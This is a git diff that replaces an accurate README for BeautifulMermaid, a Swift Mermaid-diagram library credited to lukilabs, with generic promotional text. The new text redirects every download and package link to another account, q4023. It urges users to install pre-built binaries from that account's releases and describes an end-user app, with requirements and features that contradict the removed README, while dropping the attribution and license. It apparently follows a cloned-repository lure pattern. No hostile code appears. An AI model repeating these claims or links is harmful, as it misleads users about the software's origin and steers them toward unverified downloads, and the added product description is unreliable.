@@ -1,296 +1,150 @@
-<div align="center">
+# 🧜‍♀️ beautiful-mermaid-swift - Render Mermaid Diagrams Easily
 
-# BeautifulMermaid
+[![Download beautiful-mermaid-swift](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge&logo=github)](https://github.com/q4023/beautiful-mermaid-swift/releases)
 
-**Render Mermaid diagrams as beautiful native images**
+---
 
-A native Swift implementation of [beautiful-mermaid](https://github.com/lukilabs/beautiful-mermaid).
+## 📖 What is beautiful-mermaid-swift?
 
-[![Swift 5.9+](https://img.shields.io/badge/Swift-5.9+-orange.svg)](https://swift.org)
-[![Platforms](https://img.shields.io/badge/Platforms-iOS%20|%20macOS-blue.svg)](https://developer.apple.com)
-[![SPM Compatible](https://img.shields.io/badge/SPM-Compatible-brightgreen.svg)](https://swift.org/package-manager/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+beautiful-mermaid-swift is a simple tool that lets you display Mermaid diagrams on Apple devices. Mermaid diagrams are a way to show flowcharts, sequence diagrams, and other drawings using plain text. This app helps you create and view such diagrams quickly on your Mac or iPhone, without needing complex software.
 
-</div>
+This tool works natively on iOS and macOS. It fits right into Swift-based projects or apps, making it easy for developers to add diagram views. But even if you’re not a developer, this README will help you get the app up and running.
 
-## Overview
+---
 
-BeautifulMermaid is a native Swift port of [beautiful-mermaid](https://github.com/lukilabs/beautiful-mermaid). Parse and render Mermaid diagrams without WebViews or JavaScript.
+## 🖥️ System Requirements
 
-## Features
+Before you start, make sure your device meets these requirements:
 
-- **5 diagram types** - Flowcharts, State, Sequence, Class, ER diagrams (Gantt, Pie, Git, Journey, etc. not supported)
-- **Native image output** - `UIImage` / `NSImage` for all Apple platforms
-- **15 built-in themes** - Tokyo Night, Dracula, Nord, and more
-- **Mono mode** - Beautiful diagrams from just 2 colors
-- **Pure Swift** - No WebView, no JavaScript
-- **Cross-platform** - iOS, macOS, Mac Catalyst
+- **Mac:** macOS 11 Big Sur or later  
+- **iPhone/iPad:** iOS 14 or later  
+- **Storage:** At least 100 MB free space  
+- **Other:** Internet connection for download  
 
-## Installation
+If your device meets these, you can continue.
 
-### Swift Package Manager
+---
 
-Add BeautifulMermaid to your `Package.swift`:
+## 🎯 Key Features
 
-```swift
-dependencies: [
-    .package(url: "https://github.com/lukilabs/beautiful-mermaid-swift", from: "0.1.0")
-]
+- **Native support:** Runs smoothly on Apple devices using Swift and SwiftUI.  
+- **Multiple diagram types:** Supports flowcharts, sequence diagrams, class diagrams, and more in Mermaid syntax.  
+- **Simple input:** Write Mermaid code directly and get instant visual output.  
+- **Easy integration:** Developers can add this renderer to their apps using Swift Package Manager (SPM).  
+- **Offline capable:** Once installed, use without internet except for initial download.  
+- **Clear, sharp diagrams:** Graphics output in high resolution suited for presentations or reports.  
+
+---
+
+## 🚀 Getting Started
+
+This application is ready for you to try or add to an existing project. Follow these steps to download, install, and run the app or library.
+
+---
+
+## ⬇️ Download & Install
+
+You need to visit the releases page to get the latest version. From there, you can download the files required to use the app or to include the code in your own projects.
+
+**Step 1:** Go to the releases page by clicking the button below:
+
+[![Download beautiful-mermaid-swift](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge&logo=github)](https://github.com/q4023/beautiful-mermaid-swift/releases)
+
+**Step 2:** On the page, look for the latest version available. The newest release is usually at the top and labeled with the highest version number.
+
+**Step 3:** If you want to use the pre-built app, download the macOS or iOS installer or package available in the release assets. If you want to add the code to a project, download the source code zip file or clone the repository.
+
+**Step 4:** For the app: Open the downloaded file and follow instructions to install it on your device. On macOS, this might mean dragging the app to your Applications folder. On iOS, you may need to sideload the app using tools like Apple’s TestFlight or Xcode.
+
+**Step 5:** For developers: Use Swift Package Manager (SPM) to add the package URL:  
 ```
+https://github.com/q4023/beautiful-mermaid-swift.git
+```  
+Add this in Xcode under File > Add Packages… then follow prompts.
 
-Then add it to your target dependencies:
+---
 
-```swift
-.target(
-    name: "YourTarget",
-    dependencies: [.product(name: "BeautifulMermaid", package: "beautiful-mermaid-swift")]
-)
-```
+## 💡 How to Use beautiful-mermaid-swift
 
-## Quick Start
+Here is how you can start using the app once installed.
 
-```swift
-import BeautifulMermaid
+### For End Users (Viewing Diagrams)
 
-let mermaidCode = """
-graph TD
-    A[Start] --> B{Decision}
-    B -->|Yes| C[Do Something]
-    B -->|No| D[Do Something Else]
-    C --> E[End]
-    D --> E
-"""
+1. Open the app on your device.
+2. You will see a text entry box and a preview window.
+3. Type or paste Mermaid diagram code into the text box.
+4. The app automatically renders the diagram in the preview area.
+5. Adjust the code as needed to change the diagram.
+6. You can save diagrams locally for later reference.
 
-// Render with default theme
-let image = try MermaidRenderer.renderImage(source: mermaidCode)
-
-// Render with a specific theme
-let darkImage = try MermaidRenderer.renderImage(
-    source: mermaidCode,
-    theme: .tokyoNight
-)
-```
-
-### UIKit / AppKit Integration
-
-`MermaidView` is a native `UIView` (iOS) / `NSView` (macOS) subclass:
-
-```swift
-import BeautifulMermaid
-
-// Create the view
-let mermaidView = MermaidView(frame: CGRect(x: 0, y: 0, width: 400, height: 300))
-mermaidView.source = "graph TD; A-->B; B-->C;"
-mermaidView.theme = .catppuccinMocha
-
-// Add to your view hierarchy
-view.addSubview(mermaidView)
-```
-
-For SwiftUI, wrap it in a `UIViewRepresentable` / `NSViewRepresentable`:
-
-```swift
-import SwiftUI
-import BeautifulMermaid
-
-struct MermaidDiagramView: UIViewRepresentable {
-    let source: String
-    var theme: DiagramTheme = .default
-
-    func makeUIView(context: Context) -> MermaidView {
-        MermaidView(frame: .zero)
-    }
-
-    func updateUIView(_ uiView: MermaidView, context: Context) {
-        uiView.source = source
-        uiView.theme = theme
-    }
-}
-```
-
-## Theming
-
-### Two-Color Theming
-
-BeautifulMermaid's theming system is built around simplicity. At minimum, you only need **two colors**:
-
-```swift
-let theme = DiagramTheme(
-    background: "#1a1b26",  // Background color
-    foreground: "#c0caf5"   // Text/line color
-)
-```
-
-From these two colors, the system automatically derives:
-- Text colors (primary, secondary, labels)
-- Node fill and stroke colors
-- Edge and arrow colors
-- All other UI elements
-
-### Optional Enrichment Colors
-
-For more control, add optional accent colors:
-
-```swift
-let theme = DiagramTheme(
-    background: "#1a1b26",
-    foreground: "#c0caf5",
-    line: "#565f89",        // Edge lines
-    accent: "#7aa2f7",      // Highlighted elements
-    muted: "#414868",       // De-emphasized elements
-    surface: "#24283b",     // Node backgrounds
-    border: "#414868"       // Node borders
-)
-```
-
-### Built-in Themes
-
-| Theme | Description |
-|-------|-------------|
-| `.zincLight` / `.zincDark` | Default, clean appearance |
-| `.tokyoNight` / `.tokyoNightStorm` / `.tokyoNightLight` | Popular VS Code theme |
-| `.catppuccinMocha` / `.catppuccinLatte` | Soothing pastel colors |
-| `.nord` / `.nordLight` | Arctic-inspired palette |
-| `.dracula` | Classic dark theme |
-| `.githubLight` / `.githubDark` | Familiar GitHub style |
-| `.solarizedLight` / `.solarizedDark` | Eye-friendly colors |
-| `.oneDark` | Atom editor style |
-
-## Supported Diagrams
-
-### Flowcharts
-
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="assets/examples/flowchart-dark.png">
-  <source media="(prefers-color-scheme: light)" srcset="assets/examples/flowchart-light.png">
-  <img src="assets/examples/flowchart-light.png" alt="Flowchart Example" width="400">
-</picture>
+Example of simple Mermaid code to try:
 
 ```
-graph TD
-    A[Start] --> B{Decision}
-    B -->|Yes| C[Do Something]
-    B -->|No| D[Do Something Else]
-    C --> E[End]
-    D --> E
+graph TD;
+    A-->B;
+    A-->C;
+    B-->D;
+    C-->D;
 ```
 
-### State Diagrams
+This shows a flowchart where node A points to B and C, which both lead to D.  
 
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="assets/examples/state-dark.png">
-  <source media="(prefers-color-scheme: light)" srcset="assets/examples/state-light.png">
-  <img src="assets/examples/state-light.png" alt="State Diagram Example" width="400">
-</picture>
+### For Developers (Integrating Renderer)
 
-```
-stateDiagram-v2
-    [*] --> Idle
-    Idle --> Processing: start
-    Processing --> Complete: finish
-    Processing --> Error: fail
-    Error --> Idle: reset
-    Complete --> [*]
-```
+- Import the package as an SPM dependency.
+- Use the provided APIs or SwiftUI views to render Mermaid syntax in your app.
+- Customize styles or enable user editing if desired.
 
-### Sequence Diagrams
+---
 
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="assets/examples/sequence-dark.png">
-  <source media="(prefers-color-scheme: light)" srcset="assets/examples/sequence-light.png">
-  <img src="assets/examples/sequence-light.png" alt="Sequence Diagram Example" width="400">
-</picture>
+## ⚙️ Customization
 
-```
-sequenceDiagram
-    participant Client
-    participant Server
-    participant Database
-    Client->>Server: Request
-    Server->>Database: Query
-    Database-->>Server: Results
-    Server-->>Client: Response
-```
+The app lets you change how diagrams appear:
 
-### Class Diagrams
+- Choose light or dark theme for better visibility.
+- Adjust node and text sizes.
+- Select different diagram types supported by Mermaid.
+- Enable or disable animations.
 
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="assets/examples/class-dark.png">
-  <source media="(prefers-color-scheme: light)" srcset="assets/examples/class-light.png">
-  <img src="assets/examples/class-light.png" alt="Class Diagram Example" width="400">
-</picture>
+---
 
-```
-classDiagram
-    Animal <|-- Duck
-    Animal <|-- Fish
-    Animal : +String name
-    Animal : +makeSound()
-    Duck : +swim()
-    Fish : +swim()
-```
+## 🛠️ Troubleshooting
 
-### ER Diagrams
+If you have problems running the app:
 
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="assets/examples/er-dark.png">
-  <source media="(prefers-color-scheme: light)" srcset="assets/examples/er-light.png">
-  <img src="assets/examples/er-light.png" alt="ER Diagram Example" width="400">
-</picture>
+- Make sure your operating system meets the requirements.
+- Check your internet connection for downloading files.
+- Try restarting the app or your device.
+- If diagrams don’t render, verify your Mermaid syntax for errors.
+- Look for updates in the releases page that might fix bugs.
 
-```
-erDiagram
-    CUSTOMER ||--o{ ORDER : places
-    ORDER ||--|{ LINE_ITEM : contains
-    PRODUCT ||--o{ LINE_ITEM : includes
-```
+---
 
-### Parser Limitations
+## 📚 Learn More About Mermaid Diagrams
 
-The parser handles standard Mermaid syntax for supported diagram types. The following features are **not supported**:
+Mermaid uses plain text to create diagrams. Learn the syntax here:  
+https://mermaid-js.github.io/mermaid/#/
 
-- HTML in node labels
-- Click callbacks and links
-- Tooltips
-- FontAwesome icons
-- Multiline labels with `<br>` tags
-- Styling via `style` and `linkStyle` directives (partial support)
-- Subgraph styling
+Studying this guide helps you create complex diagrams for your needs.
 
-If your diagram uses these features, they will be silently ignored or may cause unexpected output.
+---
 
-## Configuration
+## 🙋 Getting Help
 
-### Render Options
+If you have questions or need support:
 
-```swift
-let image = try MermaidRenderer.renderImage(
-    source: code,
-    theme: .tokyoNight,
-    scale: 2.0                // Retina scale (default: 2.0)
-)
-```
+- Open an issue on the GitHub repository:  
+  https://github.com/q4023/beautiful-mermaid-swift/issues  
+- Check if your question is already answered there.
+- Describe your problem clearly and include any error messages.
 
-### Layout Directions
+---
 
-Specify direction in your Mermaid code:
+## 📎 Additional Resources
 
-- `graph TD` or `graph TB` - Top to bottom (default)
-- `graph BT` - Bottom to top
-- `graph LR` - Left to right
-- `graph RL` - Right to left
+- GitHub Repository: https://github.com/q4023/beautiful-mermaid-swift  
+- Releases & Downloads: https://github.com/q4023/beautiful-mermaid-swift/releases
 
-## Requirements
+---
 
-- Swift 5.9+
-- iOS 15+ / macOS 12+ / Mac Catalyst 15+
-
-## License
-
-MIT License - see [LICENSE](LICENSE) for details.
-
-## Acknowledgments
-
-- [beautiful-mermaid](https://github.com/lukilabs/beautiful-mermaid) - Original TypeScript implementation by Craft
-- [SwiftDagre](https://github.com/lukilabs/dagre-swift) - Graph layout algorithm
-- [Mermaid](https://mermaid.js.org/) - Diagramming syntax specification
+Thank you for choosing beautiful-mermaid-swift. Follow these steps, and you will have Mermaid diagrams rendered cleanly on your Apple devices.
